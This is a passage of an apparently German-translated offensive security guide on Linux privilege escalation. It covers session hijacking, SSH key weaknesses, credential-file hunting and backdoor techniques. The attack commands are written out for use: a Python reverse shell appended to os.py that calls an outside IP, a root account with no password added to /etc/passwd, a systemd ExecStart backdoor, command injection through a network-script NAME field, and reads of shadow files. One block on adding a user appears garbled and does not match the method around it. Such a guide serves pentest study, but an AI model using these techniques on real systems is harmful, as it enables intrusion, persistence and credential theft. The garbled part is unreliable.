In **älteren Versionen** kannst du möglicherweise eine **shell**-Session eines anderen user (**root**) **hijack**.\
In **neueren Versionen** kannst du **connect** nur zu screen sessions von **your own user**. Allerdings könntest du **interesting information inside the session** finden.

### screen sessions hijacking

**List screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**An eine Session anhängen**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Dies war ein Problem bei **älteren tmux-Versionen**. Ich konnte eine von root erstellte tmux (v2.1)-Session als nicht-privilegierter Benutzer nicht hijacken.

**tmux-Sitzungen auflisten**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**An eine Session anhängen**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Siehe **Valentine box from HTB** als Beispiel.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Alle SSL- und SSH-Schlüssel, die auf Debian-basierten Systemen (Ubuntu, Kubuntu, etc) zwischen September 2006 und dem 13. Mai 2008 erstellt wurden, können von diesem Bug betroffen sein.\
Dieser Bug tritt beim Erstellen eines neuen ssh keys in diesen OS auf, da **nur 32,768 Variationen möglich waren**. Das bedeutet, dass alle Möglichkeiten berechnet werden können und **wenn Sie den ssh public key haben, können Sie nach dem entsprechenden private key suchen**. You can find the calculated possibilities here: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Wichtige Konfigurationswerte

- **PasswordAuthentication:** Gibt an, ob password authentication erlaubt ist. Der Standard ist `no`.
- **PubkeyAuthentication:** Gibt an, ob public key authentication erlaubt ist. Der Standard ist `yes`.
- **PermitEmptyPasswords**: Wenn password authentication erlaubt ist, gibt diese Option an, ob der Server Login zu Accounts mit empty password strings erlaubt. Der Standard ist `no`.

### PermitRootLogin

Gibt an, ob root sich per ssh anmelden kann, der Standard ist `no`. Mögliche Werte:

- `yes`: root kann sich mit password und private key anmelden
- `without-password` or `prohibit-password`: root kann sich nur mit einem private key anmelden
- `forced-commands-only`: root kann sich nur mit private key anmelden und nur, wenn die commands-Optionen angegeben sind
- `no`: nicht erlaubt

### AuthorizedKeysFile

Gibt Dateien an, die die public keys enthalten, die für user authentication verwendet werden können. Es können Token wie `%h` enthalten sein, die durch das Home-Verzeichnis ersetzt werden. **Sie können absolute Pfade angeben** (beginnen mit `/`) oder **relative Pfade vom Home des Benutzers**. Zum Beispiel:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding allows you to **use your local SSH keys instead of leaving keys** (without passphrases!) sitting on your server. So, you will be able to **jump** via ssh **to a host** and from there **jump to another** host **using** the **key** located in your **initial host**.

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
Beachte, dass wenn `Host` `*` ist, jedes Mal, wenn sich der Benutzer mit einer anderen Maschine verbindet, dieser Host auf die keys zugreifen kann (was ein Sicherheitsproblem darstellt).

Die Datei `/etc/ssh_config` kann diese **Optionen** **überschreiben** und diese Konfiguration erlauben oder verweigern.\
Die Datei `/etc/sshd_config` kann ssh-agent forwarding mit dem Keyword `AllowAgentForwarding` **erlauben** oder **verweigern** (Standard ist allow).

Wenn du feststellst, dass Forward Agent in einer Umgebung konfiguriert ist, lies die folgende Seite, da **du es möglicherweise missbrauchen kannst, um escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interessante Dateien

### Profile-Dateien

Die Datei `/etc/profile` und die Dateien unter `/etc/profile.d/` sind **Skripte, die ausgeführt werden, wenn ein Benutzer eine neue Shell startet**. Daher, wenn du eine von ihnen **schreiben oder ändern** kannst, kannst du **escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Wenn ein ungewöhnliches Profilskript gefunden wird, solltest du es auf **sensible Details** überprüfen.

### Passwd/Shadow-Dateien

Je nach OS können die Dateien `/etc/passwd` und `/etc/shadow` einen anderen Namen haben oder es kann eine Sicherung existieren. Daher wird empfohlen, **alle zu finden** und **zu prüfen, ob du sie lesen kannst**, um zu sehen, **ob sich Hashes in den Dateien befinden**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
In einigen Fällen findet man **password hashes** in der Datei `/etc/passwd` (oder einer entsprechenden Datei)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Schreibbare /etc/passwd

Erzeuge zuerst ein Passwort mit einem der folgenden Befehle.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
### Benutzerkonto hinzufügen

Füge den Benutzer `hacker` hinzu und setze das generierte Passwort:

```bash
# Generiertes Passwort (Beispiel)
password='N7r$4qP9u!k2'

# Benutzer anlegen und Passwort setzen
sudo useradd -m -s /bin/bash hacker
echo "hacker:$password" | sudo chpasswd

# Optional: hacker zur sudo-Gruppe hinzufügen
sudo usermod -aG sudo hacker
```

Das generierte Passwort ist: N7r$4qP9u!k2
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
z. B.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Du kannst nun den `su`-Befehl mit `hacker:hacker` verwenden.

Alternativ kannst du die folgenden Zeilen verwenden, um einen Dummy-Benutzer ohne Passwort hinzuzufügen.\
WARNUNG: Dadurch kann die aktuelle Sicherheit der Maschine beeinträchtigt werden.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
HINWEIS: Auf BSD-Plattformen befindet sich `/etc/passwd` unter `/etc/pwd.db` und `/etc/master.passwd`, außerdem wurde `/etc/shadow` in `/etc/spwd.db` umbenannt.

Du solltest prüfen, ob du in einige **sensible Dateien** schreiben kannst. Zum Beispiel: Kannst du in eine **Service-Konfigurationsdatei** schreiben?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Zum Beispiel: Wenn die Maschine einen **tomcat** Server ausführt und Sie **modify the Tomcat service configuration file inside /etc/systemd/,** können, dann können Sie die folgenden Zeilen ändern:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Deine backdoor wird beim nächsten Start von tomcat ausgeführt.

### Ordner prüfen

Die folgenden Ordner können Backups oder interessante Informationen enthalten: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Wahrscheinlich wirst du den letzten nicht lesen können, aber versuche es trotzdem.)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Seltsamer Speicherort/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Geänderte Dateien in den letzten Minuten
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB-Dateien
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml Dateien
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Versteckte Dateien
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skripte/Binärdateien in PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web-Dateien**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Sicherungen**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Bekannte Dateien, die Passwörter enthalten

Schau dir den Code von [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) an, er durchsucht mehrere mögliche Dateien, die Passwörter enthalten könnten.\
**Ein weiteres interessantes Tool**, das du dafür verwenden kannst, ist: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) welches eine Open-Source-Anwendung ist, die viele auf einem lokalen Computer gespeicherte Passwörter für Windows, Linux & Mac ausliest.

### Logs

Wenn du Logs lesen kannst, kannst du möglicherweise **interessante/vertrauliche Informationen** darin finden. Je merkwürdiger das Log ist, desto interessanter wird es vermutlich sein.\
Außerdem können einige "**schlecht**" konfigurierte (backdoored?) **audit logs** es erlauben, **Passwörter in den audit logs aufzuzeichnen**, wie in diesem Beitrag erklärt: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Um **Logs zu lesen, ist die Gruppe** [**adm**](interesting-groups-linux-pe/index.html#adm-group) sehr hilfreich.

### Shell-Dateien
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Du solltest außerdem nach Dateien suchen, die das Wort "**password**" im **Namen** oder im **Inhalt** enthalten, sowie nach IPs und emails in logs oder nach hashes regexps.\
Ich werde hier nicht aufzählen, wie man das alles macht, aber wenn du interessiert bist, kannst du dir die letzten Checks anschauen, die [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) durchführt.

## Schreibbare Dateien

### Python library hijacking

Wenn du weißt, **wo** ein python script ausgeführt wird und du **in diesen Ordner schreiben kannst** oder **modify python libraries**, kannst du die OS library ändern und mit einem backdoor versehen (wenn du dort schreiben kannst, kopiere und füge die os.py library ein).

Um **backdoor the library** durchzuführen, füge einfach am Ende der os.py library die folgende Zeile ein (IP und PORT ändern):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Eine Schwachstelle in `logrotate` erlaubt Benutzern mit **Schreibrechten** auf eine Logdatei oder deren übergeordnete Verzeichnisse, möglicherweise erhöhte Privilegien zu erlangen. Das liegt daran, dass `logrotate`, das häufig als **root** läuft, so manipuliert werden kann, dass es beliebige Dateien ausführt, insbesondere in Verzeichnissen wie _**/etc/bash_completion.d/**_. Es ist wichtig, die Berechtigungen nicht nur in _/var/log_ zu prüfen, sondern auch in jedem Verzeichnis, in dem Logrotation angewendet wird.

> [!TIP]
> Diese Schwachstelle betrifft `logrotate` Version `3.18.0` und älter

Mehr Informationen zur Schwachstelle finden Sie auf dieser Seite: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Diese Schwachstelle kann mit [**logrotten**](https://github.com/whotwagner/logrotten) ausgenutzt werden.

Diese Schwachstelle ist sehr ähnlich zu [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** daher sollten Sie, sobald Sie Logs verändern können, prüfen, wer diese Logs verwaltet, und ob Sie Privilegien eskalieren können, indem Sie die Logs durch symlinks ersetzen.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Referenz zur Schwachstelle:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Wenn ein Benutzer aus welchem Grund auch immer in der Lage ist, ein `ifcf-<whatever>`-Skript nach _/etc/sysconfig/network-scripts_ zu **schreiben** **oder** ein bestehendes zu **anpassen**, dann ist Ihr **System pwned**.

Network-Skripte, z. B. _ifcg-eth0_, werden für Netzwerkverbindungen verwendet. Sie sehen genau wie .INI-Dateien aus. Allerdings werden sie unter Linux vom Network Manager (dispatcher.d) \~gesourced\~.

In meinem Fall wird das `NAME=`-Attribut in diesen Network-Skripten nicht korrekt behandelt. **Wenn Sie Leerzeichen im Namen haben, versucht das System, den Teil nach dem Leerzeichen auszuführen.** Das bedeutet, dass **alles nach dem ersten Leerzeichen als root ausgeführt wird**.

Zum Beispiel: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Hinweis: Beachte das Leerzeichen zwischen Network und /bin/id_)

### **init, init.d, systemd, and rc.d**

Das Verzeichnis `/etc/init.d` beherbergt **Skripte** für System V init (SysVinit), das **klassische Linux-Service-Managementsystem**. Es enthält Skripte zum `start`, `stop`, `restart` und manchmal `reload` von Services. Diese können direkt ausgeführt werden oder über symbolische Links in `/etc/rc?.d/`. Ein alternativer Pfad in Redhat-Systemen ist `/etc/rc.d/init.d`.

Auf der anderen Seite ist `/etc/init` mit **Upstart** verbunden, einem neueren **Service-Management**, das von Ubuntu eingeführt wurde und Konfigurationsdateien für Service-Management-Aufgaben verwendet. Trotz des Übergangs zu Upstart werden SysVinit-Skripte weiterhin zusammen mit Upstart-Konfigurationen verwendet, da Upstart eine Kompatibilitätsschicht bietet.

**systemd** hat sich als moderner Init- und Service-Manager durchgesetzt und bietet erweiterte Funktionen wie on-demand Daemon-Start, Automount-Management und Snapshots des Systemzustands. Es organisiert Dateien in `/usr/lib/systemd/` für Distribution-Pakete und `/etc/systemd/system/` für Administrator-Anpassungen und erleichtert so die Systemverwaltung.

## Andere Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android-rooting-Frameworks hängen häufig einen syscall, um privilegierte Kernel-Funktionalität einem userspace manager zugänglich zu machen. Schwache Manager-Authentifizierung (z. B. Signaturprüfungen basierend auf FD-order oder schwache Passwortschemata) kann einer lokalen App ermöglichen, den Manager zu imitieren und auf bereits gerooteten Geräten root-Rechte zu erlangen. Mehr dazu und Exploit-Details hier:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-gesteuerte Service-Discovery in VMware Tools/Aria Operations kann einen Binärpfad aus Process-Commandlines extrahieren und diesen mit -v in einem privilegierten Kontext ausführen. Zulässige Muster (z. B. Verwendung von \S) können mit vom Angreifer abgelegten Listeners in beschreibbaren Pfaden (z. B. /tmp/httpd) übereinstimmen, was zur Ausführung als root führt (CWE-426 Untrusted Search Path).

Mehr dazu und ein generalisiertes Muster, das auf andere Discovery-/Monitoring-Stacks anwendbar ist, hier:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Mehr Hilfe

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Kernel-Vulnerabilities in Linux und macOS aufspüren [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Referenzen

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
